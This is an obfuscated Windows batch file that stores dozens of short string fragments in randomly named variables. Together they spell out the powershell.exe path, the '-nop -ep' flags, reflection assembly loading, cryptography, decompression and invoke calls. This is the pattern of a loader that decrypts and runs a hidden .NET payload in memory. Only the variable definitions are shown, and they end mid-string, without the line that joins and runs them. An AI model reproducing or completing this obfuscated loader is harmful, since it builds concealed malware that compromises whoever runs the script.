@echo off
set "hZJlgOoAFO=Sy"
set "OOemSJGVDg=0\"
set "QxknaMbmQU=ws"
set "rckDRCfLAL=:\"
set "CNISONwUkR=y "
set "MDOKXcGWjY=nd"
set "eDDNGPtSEx=he"
set "fHGXJiKIJy=s\"
set "WjBBMkBSOe=st"
set "vVLmllsgJY=py"
set "fuLqNPbLMD= /"
set "RxzQxYXQLN=do"
set "ZsNhfSoWhS= C"
set "BLcGeznpOV=we"
set "CFYUFnkQll=rs"
set "bpddUKyhUa=\v"
set "oRHexGLpmW=Wi"
set "TwcsKYZjEJ=1."
set "rXmKQZueIB=32"
set "ekCGMWfely=\W"
set "wqgIDPeiEB=.e"
set "cZaumXioao=xe"
set "ZRFCjAdHim=Po"
set "hNDnicLxhs=ll"
set "utdpRoawHH=co"
set "ZepOpsKhvI=ow"
set "CTpAcZSWHX=he"
set "VpIyUCODDu=ll"
set "SoJGJGKLjN=we"
set "GRUFCDggub=in"
set "WDTDQfWQbP=em"
set "ZotyIiGGEP=rS"
set "udckOnQlFr=po"
set "sortVXUpKW=cd"
set "ITtTZBDTqU= %~dp0"
set "FOjDDwaMdB=.Com"
set "LazbTPZsTA=UGTu"
set "RzuvwOMOGW=; };"
set "lKDkvJPQHN=ct S"
set "ZUAglOZjTz='gni"
set "TEzsbOUYnm=flec"
set "YnZnFdhdSm=.Ass"
set "eUDPOynhTa=-nop"
set "paYoxqZbkR=HzZH"
set "ybBRNVSfCm=:: '"
set "UdtNkUqrBU=1..-"
set "yJiuTBiQgm=sion"
set "sLCWUfKKYd=OyzA"
set "tuzOWQbTGX=ewLi"
set "KsBOHcqLeQ=ionM"
set "OpwYCPXbEm=1] -"
set "kPTVWCaawq=k; }"
set "KzLiztYxkF=em.C"
set "ZzQHfeFJtS=iron"
set "CdGCXykqEx=H.Pa"
set "djBQDwfvIo=yste"
set "zvGLjRvwJU=Disp"
set "SLXBUAJLNi=]::("
set "tUalWTGpPc='')("
set "rVaBkEbfDN=cSdW"
set "UIrvJSTROS= [st"
set "yMQpTAdynG=S46e"
set "rrsYjSRdNx=gMod"
set "DIgPCtAWwv=pose"
set "IYeJOjMhxN=yTo("
set "GTjQWBhRTx=y.Pa"
set "InQgRNqVLS=);$p"
set "fEswgVXyZK== $m"
set "LsJnZfnfjE=ptog"
set "AJTCIzuwIq=Cyh "
set "LuWeEhKukF=xIW."
set "ofWxMsLqeX=v4Ir"
set "ZaubOfEVMg=Wg ="
set "ImnkTmNBCT=Comp"
set "plkNqXjcnp=$Wja"
set "ZIHUJXVqdS=HzZH"
set "JyjsTmxMPG=.Len"
set "MKVOsnCXoQ=Secu"
set "HlFhQbAxZE=)))"
set "VqkJSebUjG=ment"
set "LorRwLcAzF=O.Me"
set "cWYfwQPlxV='[-1"
set "DoXGqtPhmu=]::C"
set "hstKhNESYK='[-1"
set "dORWXkbNlv=.Con"
set "plpKPirNDm=ne);"
set "lPnXvAdCsQ==');"
set "MXbFcOgVHx=::De"
set "PHOaBXhwrO=, $u"
set "UQOpweIRVR== [S"
set "DSBeqLGSUx=ke($"
set "HXqPwXrQql=oin "
set "JAhpSEBhxu=yste"
set "CJdzLQuyPW=esFX"
set "eNvknAutAp= [Sy"
set "NscvAPRTMz=ddin"
set "QvEVQQGRAj=::('"
set "KZDPuEeWkZ=] -j"
set "YpTmIQPGub=hy.A"
set "EJnJqLomJC=;$Cw"
set "ylgDTudxmP= if "
set "TDlZYDHorx=[]] "
set "sPyZVJGvkD=ress"
set "ijxMIKeUou=stem"
set "adknhPOjtj=BC;$"
set "NwWstcrMXn=($UO"
set "NFIwPRebFU=Obje"
set "NiXVQCApQA=pher"
set "UaFsxUDWFm=tS46"
set "nabcpguSLu=rZ ="
set "YgXEUZnmIp=d;$m"
set "kgbeHYxAMs=736u"
set "uLihpateBm=-ep "
set "wdoyzDLUCO=bstr"
set "GyQaMXXmpQ=Invo"
set "BWGOPdghQX=ress"
set "cMsaLfvrEb=rZ);"
set "cCrfhnJUyo=  $f"
set "EFVCgdYySl=ion."
set "iIfPZBXAlo=in $"
set "SKMdLRhgEF=ZH.I"
set "hdIXgUqUqV=.Dis"
set "fqcVekBknu=utxI"
set "MprUyMItOQ=fore"
set "gJzLKjZvHB=V = "
set "YNQuZUpbaj=7Yiv"
set "jcKZkQzSKD=[-1."
set "nJmoEDLoqj=..-1"
set "BdcURaBCRU=Secu"
set "iUYVjHEYxW=join"
set "cJIujuCHIf=vLGI"
set "VFMucCAsRe=;$pR"
set "mVCTGnGGrZ=rtS4"
set "lQvWXtfGuv='txe"
set "YOghXDeubm=+hAO"
set "EaOWdyoyUe=File"
set "wxiUeEDHnL=mHzZ"
set "iDUZziatJz=ss -"
set "wxHtUzJTOb=]::("
set "QzEkImLHQC=)($f"
set "AYPDVhvMdI=n, 0"
